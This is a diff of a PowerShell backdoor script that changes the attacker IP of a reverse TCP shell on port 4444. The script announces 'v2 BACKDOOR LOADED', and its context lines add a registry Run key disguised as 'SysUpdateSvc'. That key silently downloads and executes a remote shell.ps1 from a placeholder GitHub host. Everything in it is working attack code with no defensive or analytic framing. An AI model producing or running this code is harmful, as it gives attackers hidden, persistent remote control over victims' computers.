@@ -1,4 +1,4 @@
-$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.11.67", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("v2 BACKDOOR LOADED`nPersistence+HTTP+Keys ACTIVE`nPS " + (pwd).Path + "> "); $s.Write($m,0,$m.Length);
+$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("v2 BACKDOOR LOADED`nPersistence+HTTP+Keys ACTIVE`nPS " + (pwd).Path + "> "); $s.Write($m,0,$m.Length);
 
 $regcmd = 'powershell -w h -nop -c "IEX(New-Object Net.WebClient).DownloadString(`"https://YOUR_GITHUB/shell.ps1`")"';
 Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdateSvc' -Value $regcmd -Force;
